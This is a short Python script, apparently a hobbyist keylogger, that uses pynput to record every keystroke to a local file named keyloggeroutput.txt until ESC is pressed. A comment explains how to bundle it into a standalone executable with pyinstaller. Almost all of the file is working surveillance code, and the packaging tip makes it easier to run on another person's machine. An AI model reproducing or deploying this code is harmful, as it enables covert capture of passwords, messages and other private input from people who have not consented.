import logging
from pynput import keyboard

# if want to convert to exe use 
# Set up logging to a file pyinstaller --onefile keylogger2.py (it will be in the /dist folders)

file_log = 'keyloggeroutput.txt'
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    try:
        # Log the pressed key (converts key to character for normal keys)
        logging.info(str(key.char))
    except AttributeError:
        # Log special keys (like space, enter, etc.)
        logging.info(str(key))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC key is pressed
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()